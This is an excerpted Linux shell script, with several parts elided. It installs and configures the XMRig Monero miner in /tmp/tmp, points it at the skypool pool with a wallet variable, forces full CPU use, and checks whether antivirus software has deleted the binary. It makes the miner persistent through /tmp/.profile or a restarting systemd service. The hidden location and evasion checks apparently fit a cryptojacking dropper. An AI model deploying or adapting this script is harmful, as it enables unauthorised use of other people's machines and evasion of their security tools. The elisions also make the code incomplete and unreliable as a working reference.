...
echo "If needed, miner in foreground can be started by /tmp/tmp/miner.sh script."
...
echo "[*] Removing /tmp/tmp directory"
rm -rf /tmp/tmp
...
echo "[*] Unpacking /tmp/xmrig.tar.gz to /tmp/tmp"
[ -d /tmp/tmp ] || mkdir /tmp/tmp
if ! tar xf /tmp/xmrig.tar.gz -C /tmp/tmp; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to /tmp/tmp directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of /tmp/tmp/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /tmp/tmp/config.json
/tmp/tmp/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f /tmp/tmp/xmrig ]; then
    echo "WARNING: Advanced version of /tmp/tmp/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of /tmp/tmp/xmrig was removed by antivirus (or some other problem)"
  fi
  ...
  echo "[*] Unpacking /tmp/xmrig.tar.gz to /tmp/tmp"
  if ! tar xf /tmp/xmrig.tar.gz -C /tmp/tmp --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to /tmp/tmp directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of /tmp/tmp/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /tmp/tmp/config.json
  /tmp/tmp/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f /tmp/tmp/xmrig ]; then
      echo "ERROR: Stock version of /tmp/tmp/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of /tmp/tmp/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner /tmp/tmp/xmrig is OK"
...
sed -i 's/"url": *"[^"]*",/"url": "auto.skypool.org:'$PORT'",/' /tmp/tmp/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' /tmp/tmp/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' /tmp/tmp/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' /tmp/tmp/config.json
sed -i 's#"log-file": *null,#"log-file": "'/tmp/tmp/xmrig.log'",#' /tmp/tmp/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' /tmp/tmp/config.json

cp /tmp/tmp/config.json /tmp/tmp/config_background.json
sed -i 's/"background": *false,/"background": true,/' /tmp/tmp/config_background.json

# preparing script

echo "[*] Creating /tmp/tmp/miner.sh script"
cat >/tmp/tmp/miner.sh <<EOL
#!/bin/bash
...
chmod +x /tmp/tmp/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep skypool/miner.sh /tmp/.profile >/dev/null; then
    echo "[*] Adding /tmp/tmp/miner.sh script to /tmp/.profile"
    echo "/tmp/tmp/miner.sh --config=/tmp/tmp/config_background.json >/dev/null 2>&1" >>/tmp/.profile
  else 
    echo "Looks like /tmp/tmp/miner.sh script is already in the /tmp/.profile"
  fi
  echo "[*] Running miner in the background (see logs in /tmp/tmp/xmrig.log file)"
  /bin/bash /tmp/tmp/miner.sh --config=/tmp/tmp/config_background.json >/dev/null 2>&1
else
...
[Service]
ExecStart=/tmp/tmp/xmrig --config=/tmp/tmp/config.json
Restart=always
Nice=10
CPUWeight=1
...
if [ "$CPU_THREADS" -lt "4" ]; then
  ...
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/tmp/tmp/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/tmp/tmp/config_background.json"
fi
echo ""
